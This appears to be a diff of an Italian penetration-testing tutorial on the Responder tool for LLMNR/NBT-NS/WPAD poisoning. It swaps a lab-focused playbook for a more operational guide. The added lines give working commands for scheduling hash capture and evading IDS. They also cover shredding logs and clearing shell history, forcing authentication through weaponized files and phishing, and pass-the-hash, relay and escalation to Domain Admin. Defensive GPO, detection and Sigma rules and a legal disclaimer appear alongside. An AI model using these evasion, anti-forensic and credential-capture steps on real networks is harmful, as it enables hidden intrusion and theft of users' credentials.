+sudo python3 Responder.py -I eth0 -A
 ```
 
-Esempio di output (può variare):
+Parametro `-A` disabilita risposte. Solo monitoring.
 
-```text
-[+] Listening for events...
-```
+**Cosa osservare:**
 
-Interpretazione: Responder è pronto.
-Errore comune + fix: interfaccia errata → verifica con `ip -br a`.
+* Quali host fanno più richieste LLMNR/NBT-NS
+* Quali nomi vengono cercati (errori comuni)
+* Presenza di richieste WPAD
+* Orari di picco attività
 
-Azione di lab (sulla VM Windows): apri Esplora file e prova `\\NOEXIST\share`.
-
-Perché: forzare il fallback e ottenere un tentativo SMB.
-Cosa aspettarti: evento NetNTLM nei log.
-Comando:
+**Log analysis:**
 
 ```bash
-tail -n 30 logs/Responder-Session.log
+cat /opt/Responder/logs/Analyze* | grep "Name:" | sort | uniq -c | sort -rn
 ```
 
-Esempio di output (può variare):
+**Output:**
 
-```text
-[SMB] NTLMv2-SSP Client   : 10.10.10.10
-[SMB] NTLMv2-SSP Username : LAB\student
-[SMB] NTLMv2-SSP Hash     : student::LAB:...
+```
+  47 Name: filesrv
+  23 Name: wpad  
+  12 Name: printserver
+   8 Name: backup
 ```
 
-Interpretazione: hai la prova dell’esposizione.
-Errore comune + fix: nessun evento → ripeti il trigger e controlla con `tcpdump` se la query arriva.
+`filesrv` è cercato 47 volte → target perfetto per typo poisoning.
 
-Detection + hardening: in difesa, cerca richieste LLMNR/NBNS anomale e tentativi verso `wpad`; poi disabilita LLMNR/NBT-NS e riduci NTLM, e rafforza SMB signing dove applicabile.
+### Limitare Scope di Poisoning
 
-## Playbook 10 minuti: Responder in un lab
-
-> **In breve:** sequenza rapida per passare da “setup” a “evidenza” senza perdere tempo in tentativi casuali.
-
-### Step 1 – Identifica segmento e interfaccia corretti
-
-Verifica IP e interfacce, poi scegli quella che “vede” la victim.
+Rispondi solo a nomi specifici per ridurre noise:
 
 ```bash
-ip -br a
+# Modifica Responder.conf
+[Responder Core]
+# Rispondi solo a questi nomi
+RespondTo = filesrv,wpad,printserver
 ```
 
-### Step 2 – Esegui una passata passiva (Analyze)
+Ora Responder risponde solo a query per quei 3 nomi, ignorando tutto il resto.
 
-Prima misura se il fallback esiste davvero.
+### Timing Attack
+
+Attiva Responder solo in finestre temporali:
 
 ```bash
-sudo python3 Responder.py -I eth0 -A -v
+# Attiva alle 9:00 (inizio giornata lavorativa)
+echo "0 9 * * 1-5 cd /opt/Responder && python3 Responder.py -I eth0 -wrf > /dev/null 2>&1" | crontab -
+
+# Disattiva alle 18:00
+echo "0 18 * * 1-5 pkill -f Responder.py" | crontab -a
 ```
 
-### Step 3 – Avvia poisoning base (lab isolato)
+Catturi hash durante orario lavorativo quando c'è più attività, riduci esposizione.
 
-Passa in attivo solo se hai visto traffico utile.
+## Defense Evasion: Bypassare Rilevamenti
+
+### Cambiare Challenge Response
+
+Responder usa challenge predefinito `1122334455667788`. Cambialo:
 
 ```bash
-sudo python3 Responder.py -I eth0 -v
+nano /opt/Responder/Responder.conf
 ```
 
-### Step 4 – Forza un trigger controllato dalla VM Windows
+**Modifica:**
 
-Usa un nome host chiaramente inesistente per generare fallback.
+```ini
+[Responder Core]
+Challenge = AABBCCDDEEFF0011
+```
 
-### Step 5 – Conferma cattura nei log
+Alcuni IDS cercano il challenge di default.
 
-Non fidarti dell’output a schermo: salva evidenza dai log.
+### Cambiare Hostname Fake Server
 
 ```bash
-tail -n 50 logs/Responder-Session.log
+# Modifica Responder.conf
+[Responder Core]
+; Invece di nome random, usa nome legittimo
+NetbiosDomain = CORP
+NetbiosName = FILESRV-02
 ```
 
-### Step 6 – Se non catturi, isola il problema con tcpdump
+Il tuo fake server si presenta come `FILESRV-02.CORP` → sembra legittimo.
 
-Capisci se è un problema di rete o di tool/config.
+### Log Cleanup
 
 ```bash
-sudo tcpdump -ni eth0 udp port 5355 or udp port 137 or tcp port 445
+# Cancella log dopo ogni sessione
+cd /opt/Responder/logs
+shred -vfz -n 10 *.txt
+rm Responder.db
+
+# Cancella bash history
+history -c
+cat /dev/null > ~/.bash_history
 ```
 
-### Step 7 – Documenta detection e mitigazione
+## Mitigazioni: Come Difendersi
 
-Annota protocolli/porte osservate e quale controllo difensivo spegne l’attacco.
+### Disabilitazione Protocolli Vulnerabili
 
-## Checklist operativa
+**LLMNR - Via GPO:**
 
-> **In breve:** questa checklist ti evita i classici errori di contesto (interfaccia, porte, trigger, log) e ti costringe a produrre evidenza + mitigazione.
+```
+gpedit.msc
+→ Computer Configuration  
+→ Administrative Templates
+→ Network
+→ DNS Client
+→ Turn OFF Multicast Name Resolution = ENABLED
+```
 
-* Sei su lab/CTF/HTB/PG o rete di tua proprietà con permesso esplicito
-* Interfaccia corretta identificata con `ip -br a`
-* Hai provato `-A` (analyze) prima dell’attivo
-* Hai isolato il segmento (niente dispositivi reali o condivisi)
-* Log verificati in `logs/Responder-Session.log`
-* Trigger ripetibile definito (UNC verso host inesistente o richiesta WPAD controllata)
-* Porte libere (SMB/HTTP) e servizi locali non in conflitto
-* `tcpdump` conferma che le query arrivano
-* Hai scritto detection: UDP 5355/137 + richieste `wpad` + SMB inbound anomalo
-* Hai scritto hardening: disabilita LLMNR/NBT-NS/WPAD e riduci NTLM dove possibile
-* Hai indicato “quando NON usarlo” e impatto potenziale (legacy)
-* Hai salvato evidenza (timestamp, IP, utente, tipo evento)
+**NBT-NS - Via PowerShell (All Adapters):**
 
-## Riassunto 80/20
+```powershell
+Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | ForEach-Object {
+    $_.SetTcpipNetbios(2)  # 2 = Disable
+}
+```
 
-> **In breve:** il minimo indispensabile: misura (analyze), valida (poison), prova (log), difendi (hardening).
+**NBT-NS - Via GPO Startup Script:**
 
-| Obiettivo                     | Azione pratica                 | Comando/Strumento                                |
-| ----------------------------- | ------------------------------ | ------------------------------------------------ |
-| Capire se LLMNR/NBNS è attivo | ascolto passivo                | `Responder.py -I eth0 -A -v`                     |
-| Avviare lab poisoning base    | attivo e in attesa di trigger  | `Responder.py -I eth0 -v`                        |
-| Verificare catture            | controlla session log          | `tail -f logs/Responder-Session.log`             |
-| Capire “perché non funziona”  | osserva pacchetti in arrivo    | `tcpdump -ni eth0 udp port 5355 or udp port 137` |
-| Evitare conflitti di porte    | verifica listener locali       | `netstat -tulpn`                                 |
-| Produrre mitigazione          | spegni fallback + rafforza SMB | `SMB signing + disable LLMNR/WPAD`               |
+Crea `C:\Scripts\DisableNBTNS.ps1`:
 
-## Concetti controintuitivi
+```powershell
+$regkey = "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces"
+Get-ChildItem $regkey | ForEach-Object {
+    Set-ItemProperty -Path "$regkey\$($_.PSChildName)" -Name NetbiosOptions -Value 2 -Force
+}
+```
 
-> **In breve:** gli errori tipici non sono “tool”, ma contesto (segmento, trigger, policy) e aspettative sbagliate su cosa stai catturando.
+Deploy via:
 
-* **“Se Responder gira, allora catturo subito”**
-  No: senza trigger o fallback attivo puoi vedere zero. Prima misura con `-A`, poi genera un trigger controllato in lab.
-* **“Ho preso un hash = ho la password”**
-  No: NetNTLM è evidenza di autenticazione, non password in chiaro. Usalo per dimostrare rischio e guidare hardening.
-* **“WPAD è solo un dettaglio di proxy”**
-  In realtà può innescare autenticazioni automatiche. In lab è ottimo per demo, ma è anche il punto più “impattante”.
-* **“Basta spegnere una cosa e siamo ok”**
-  Spesso serve difesa a strati: disabilitare fallback + ridurre NTLM + policy SMB più robuste + monitoraggio.
+```
+gpedit.msc
+→ Computer Configuration
+→ Windows Settings  
+→ Scripts
+→ Startup
+→ Add → DisableNBTNS.ps1
+```
 
-## FAQ
+### Abilitazione SMB Signing (CRITICO)
 
-> **In breve:** risposte rapide ai blocchi più comuni quando stai imparando Responder in lab.
+**Via GPO:**
 
-D: Responder non cattura nulla, ma vedo query in analyze. Perché?
+```
+gpedit.msc
+→ Computer Configuration
+→ Windows Settings
+→ Security Settings
+→ Local Policies
+→ Security Options
 
-R: Spesso i server rogue non sono attivi in config o non arriva un trigger che provoca autenticazione. Verifica `Responder.conf` e forza un UNC verso host inesistente.
+Enable BOTH:
+- Microsoft network client: Digitally sign communications (always)
+- Microsoft network server: Digitally sign communications (always)
+```
 
-D: Posso usare Responder su Wi-Fi?
+**Verifica applicazione:**
 
-R: Sì in lab, ma devi essere sullo stesso segmento e vedere traffico utile. Su Wi-Fi isolati/guest spesso non vedi broadcast come ti aspetti.
+```powershell
+Get-SmbServerConfiguration | Select EnableSecuritySignature,RequireSecuritySignature
+```
 
-D: Perché `smbd` mi rompe Responder?
+**Output atteso:**
 
-R: Perché occupa la porta SMB (445). In lab ferma `smbd/nmbd` oppure usa un ambiente dove non sono in esecuzione.
+```
+EnableSecuritySignature RequireSecuritySignature
+----------------------- -------------------------
+                   True                      True
+```
 
-D: Qual è la mitigazione “più efficace” contro i relay NTLM?
+### Network Segmentation
 
-R: In generale ridurre NTLM e richiedere firme/controlli robusti (es. SMB signing) aiuta molto, insieme a disabilitare LLMNR/NBT-NS e controllare WPAD.
+```
+VLAN 10 - Domain Controllers
+  ↓ Isolated, SMB Signing REQUIRED
+VLAN 20 - Servers (File/Print)
+  ↓ SMB Signing REQUIRED
+VLAN 30 - Workstations
+  ↓ SMB Signing REQUIRED, LLMNR/NBT-NS DISABLED
+VLAN 40 - Guest/IoT
+  ↓ No SMB access
+```
 
-D: Responder è “rumoroso”?
+Firewall rules tra VLAN:
 
-R: Può esserlo se attivi troppi server e rispondi a tutto. Parti con `-A`, poi abilita solo ciò che serve e documenta l’impatto.
+```
+DENY VLAN 30 → VLAN 10 (Workstation → DC) eccetto porte autorizzate
+DENY VLAN 40 → ALL (Guest isolated)
+```
 
-## Link utili su HackIta.it
+### Monitoring e Detection
 
-> **In breve:** pagine del cluster ordinate per passare da visione (pillar) a acquisizione (spoke) a supporto (child).
+**Sysmon Rules per Responder:**
 
-* BloodHound: mappa l’Active Directory come un hacker: [https://hackita.it/articoli/bloodhound/](https://hackita.it/articoli/bloodhound/)
-* Ldapsearch: enumerazione utenti e directory in attacco: [https://hackita.it/articoli/ldapsearch/](https://hackita.it/articoli/ldapsearch/)
-* Inveigh: attacchi su reti Windows per rubare hash NTLM via LLMNR/NBNS/WPAD: [https://hackita.it/articoli/inveigh/](https://hackita.it/articoli/inveigh/)
-* NBTScan: scansione silenziosa della rete Windows via NetBIOS: [https://hackita.it/articoli/nbtscan/](https://hackita.it/articoli/nbtscan/)
-* Bettercap: MITM, sniffing e spoofing in network hacking: [https://hackita.it/articoli/bettercap/](https://hackita.it/articoli/bettercap/)
-* Mitmproxy: analizza e manipola traffico HTTPS da terminale: [https://hackita.it/articoli/mitmproxy/](https://hackita.it/articoli/mitmproxy/)
+```xml
+<Sysmon schemaversion="4.82">
+  <EventFiltering>
+    <NetworkConnect onmatch="include">
+      <DestinationPort condition="is">5355</DestinationPort>
+      <DestinationPort condition="is">137</DestinationPort>
+    </NetworkConnect>
+  </EventFiltering>
+</Sysmon>
+```
 
-Pagine istituzionali:
+**Splunk Detection:**
 
-* /supporto/
-* /contatto/
-* /articoli/
-* /servizi/
-* /about/
-* /categorie/
+```spl
+index=network sourcetype=firewall dest_port IN (137,5355,5353)
+| stats count by src_ip dest_ip
+| where count > 50
+| table src_ip count
+```
 
-## Riferimenti autorevoli
+**Sigma Rule:**
 
-> **In breve:** fonti primarie per opzioni/behavior di Responder e per la difesa (SMB signing).
+```yaml
+title: Responder LLMNR/NBT-NS Poisoning
+status: experimental
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID: 3
+        DestinationPort:
+            - 5355
+            - 137
+            - 5353
+    condition: selection
+```
 
-* Responder (repo ufficiale): [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)
-* Microsoft Learn – SMB signing (difesa contro relay/spoofing): [https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing)
+## Tabella Tattiche Operative
 
-## CTA finale HackITA
+| Tecnica               | Trigger               | Interazione Richiesta   | Stealth Level | Efficacia |
+| --------------------- | --------------------- | ----------------------- | ------------- | --------- |
+| UNC Path in Explorer  | `\\attacker_ip\share` | User digita manualmente | Basso         | 100%      |
+| SCF File Injection    | User apre cartella    | Zero-click              | Alto          | 95%       |
+| LNK Poisoning         | User naviga cartella  | Zero-click (preview)    | Alto          | 90%       |
+| HTML IMG Tag          | User apre HTML        | Zero-click              | Medio         | 85%       |
+| LLMNR Poisoning       | User typo share name  | Zero (attesa passiva)   | Altissimo     | 70%       |
+| WPAD Attack           | Browser avvio         | Zero                    | Alto          | 60%       |
+| Office Doc Remote IMG | User apre documento   | Zero-click              | Medio         | 80%       |
+| URL File              | User apre .url file   | Single-click            | Medio         | 75%       |
 
-Supporta HackIta: se questi contenuti ti fanno risparmiare ore di lab e ti aiutano a ragionare “da attacker” in modo etico, considera una donazione su /supporto/
+## Checklist Engagement
 
-Formazione 1:1: se vuoi fare il salto (AD labs, metodologia, report), trovi percorsi e coaching su /servizi/
+**Pre-Attack:**
 
-Servizi per aziende/assessment: per attività autorizzate (assessment, hardening, test interni) e lavoro serio con deliverable, contattami da /servizi/
+* Setup Kali con Responder aggiornato
+* Verificato IP attacker raggiungibile da target
+* Configurato logging completo (`-v`)
+* Testato connettività SMB con test innocuo
+* Preparato file weaponizzati (SCF, LNK, HTML)
+
+**During Attack:**
+
+* Responder in ascolto su interfaccia corretta
+* Monitoraggio attivo log in real-time: `tail -f logs/*.txt`
+* Documentato ogni hash catturato (timestamp, IP, username)
+* Verificato SMB signing su target prima di relay
+* Testato hash catturati con cracking rapido
+
+**Post-Exploitation:**
+
+* Copiato tutti log in storage sicuro
+* Tentato lateral movement con hash catturati
+* Escalation a Domain Admin se possibile
+* Documentato catena di attacco completa
+* Cleanup: terminato Responder, cancellato tracce
+
+**Reporting:**
+
+* Lista completa credenziali compromesse
+* Screenshot capture hash
+* Evidence SMB relay riuscito
+* Raccomandazioni prioritizzate
+* Timeline attacco per cliente
+
+## FAQ Pratiche CTF
+
+**Responder non cattura hash quando digito \ip\share - perché?**
+
+Verifica:
+
+1. Firewall Kali blocca porte 445/137/5355: `sudo ufw status`
+2. Responder effettivamente in ascolto: `sudo netstat -tulpn | grep python`
+3. IP Kali raggiungibile da Windows: `ping 192.168.1.100`
+4. Windows Firewall blocca SMB outbound (raro ma possibile)
+
+**Come forzo connessione SMB senza accesso fisico a Windows?**
+
+* Email con HTML weaponizzato (img tag UNC path)
+* File SCF su share già compromessa
+* Social engineering: "Apri questo documento importante.docx"
+* Phishing con URL file attachment
+
+**MultiRelay non funziona - errore libreria Crypto**
+
+```bash
+# Fix su Kali
+pip3 install pycryptodome
+# oppure
+pip3 install pycrypto
+```
+
+Se persiste, usa Impacket ntlmrelayx invece di MultiRelay:
+
+```bash
+impacket-ntlmrelayx -tf targets.txt -smb2support
+```
+
+**Posso catturare hash su rete WiFi pubblica (Futuro Ufficio Hackita.it?)?**
+
+Tecnicamente sì se:
+
+* Client isolation disabilitata
+* Sei su stessa subnet delle vittime
+* Router permette multicast/broadcast
+
+Ma è **illegale** senza autorizzazione. Solo su reti di test.
+
+***P.S aiutaci a creare il nostro ufficio con una donzione cliccando [qui.](https://hackita.it/supporto)***
+
+**L'hash catturato non cracca - alternative?**
+
+1. **Pass-the-Hash**: Usa direttamente con `impacket-psexec`
+2. **SMB Relay**: Se hai altri target vulnerabili
+3. **Rainbow Tables**: Se password semplice ma non in wordlist
+4. **Kerberoasting**: Se in dominio AD, attacca service account invece
+
+**Responder triggera alert antivirus?**
+
+Responder script Python raramente. Ma:
+
+* Fake server SMB/HTTP può triggerare EDR behavioral detection
+* Poisoning multicast visibile a IDS/IPS avanzati
+* Log Windows Event 4648 (explicit credentials) aumentano
+
+**Mitigazione**: Usa `-A` (analyze) per reconnaissance passiva prima.
+
+**Quanto tempo lasciare Responder attivo in pentest autorizzato?**
+
+* Small office (10-50 PC): 2-4 ore
+* Medium enterprise (100-500 PC): 8-24 ore
+* Large corp (1000+ PC): 24-72 ore
+
+Di solito primi hash arrivano in 15-30 minuti in rete attiva.
+
+***
+
+**Repository e Risorse:**
+
+* [Responder GitHub Ufficiale](https://github.com/lgandx/Responder)
+* [Impacket per Pass-the-Hash](https://github.com/SecureAuthCorp/impacket)
+* [Guida Netcat Network Tools](https://hackita.it/articoli/netcat)
+* [SMBClient Enumeration Guide](https://hackita.it/articoli/smbclient)
+
+**Disclaimer Legale:** Tutte le tecniche descritte sono esclusivamente per scopi educativi e penetration testing autorizzato. L'utilizzo di Responder su reti non di proprietà senza esplicito consenso scritto costituisce reato penale in tutte le giurisdizioni. Ottieni sempre autorizzazione formale documentata prima di qualsiasi test di sicurezza.
